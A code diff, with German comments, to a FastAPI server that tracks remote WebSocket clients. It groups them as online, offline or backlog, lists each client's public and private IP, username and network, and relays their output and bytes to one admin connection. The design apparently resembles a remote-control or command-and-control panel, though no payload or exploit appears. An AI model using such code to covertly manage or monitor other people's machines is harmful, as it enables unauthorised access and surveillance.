@@ -17,24 +17,42 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-clients = {}
-last_seen = {}
-client_infos = {}
+clients = {}          # client_id → WebSocket
+last_seen = {}        # client_id → timestamp
+client_infos = {}     # client_id → info dict
 admin_ws = None
+
+# Thresholds in Sekunden
+OFFLINE_THRESHOLD = 60    # ab hier als "Offline" gelistet
+BACKLOG_THRESHOLD = 120   # ab hier ins Backlog verschieben
 
 @app.get("/clients")
 async def list_clients():
     now = time.time()
-    result = []
-    for client_id in clients:
-        status = "Online" if now - last_seen.get(client_id, 0) < 20 else "Offline"
-        info = client_infos.get(client_id, {})
-        result.append({
-            "id": client_id,
-            "status": status,
-            "info": info
-        })
-    return {"clients": result}
+    online = []
+    offline = []
+    backlog = []
+    for cid, ws in clients.items():
+        delta = now - last_seen.get(cid, 0)
+        info = client_infos.get(cid, {})
+        entry = {
+            "id": cid,
+            "public_ip": info.get("public_ip", ""),
+            "private_ip": info.get("private_ip", ""),
+            "username": info.get("username", ""),
+            "network": info.get("network", ""),
+            "last_seen": last_seen.get(cid, 0),
+        }
+        if delta >= BACKLOG_THRESHOLD:
+            entry["status"] = "Backlog"
+            backlog.append(entry)
+        elif delta >= OFFLINE_THRESHOLD:
+            entry["status"] = "Offline"
+            offline.append(entry)
+        else:
+            entry["status"] = "Online"
+            online.append(entry)
+    return {"online": online, "offline": offline, "backlog": backlog}
 
 @app.websocket("/ws/client/{client_id}")
 async def websocket_client(websocket: WebSocket, client_id: str):
@@ -46,19 +64,25 @@ async def websocket_client(websocket: WebSocket, client_id: str):
         while True:
             data = await websocket.receive()
             last_seen[client_id] = time.time()
+
+            # Client-Info
             if "text" in data:
                 try:
                     msg = json.loads(data["text"])
                     if msg.get("type") == "client_info":
+                        # speichere alle Infos inkl. private_ip & network
                         client_infos[client_id] = msg.get("data", {})
                         continue
-                except:
-                    msg = data["text"]
+                except json.JSONDecodeError:
+                    pass
+
+                # Weiterleitung von Ausgaben/Bytes an Admin-WS
                 if admin_ws:
-                    await admin_ws.send_text(f"[{client_id}] {msg}")
-            elif "bytes" in data:
-                if admin_ws:
-                    await admin_ws.send_bytes(data["bytes"])
+                    if "text" in data:
+                        await admin_ws.send_text(f"[{client_id}] {data['text']}")
+                    else:
+                        await admin_ws.send_bytes(data["bytes"])
+
     except WebSocketDisconnect:
         clients.pop(client_id, None)
         last_seen.pop(client_id, None)
@@ -82,8 +106,7 @@ async def websocket_admin(websocket: WebSocket):
 @app.get("/")
 async def serve_index():
     with open("static/index.html") as f:
-        html_content = f.read()
-    return HTMLResponse(content=html_content, status_code=200)
+        return HTMLResponse(content=f.read(), status_code=200)
 
 app.mount("/static", StaticFiles(directory="static"), name="static")
 
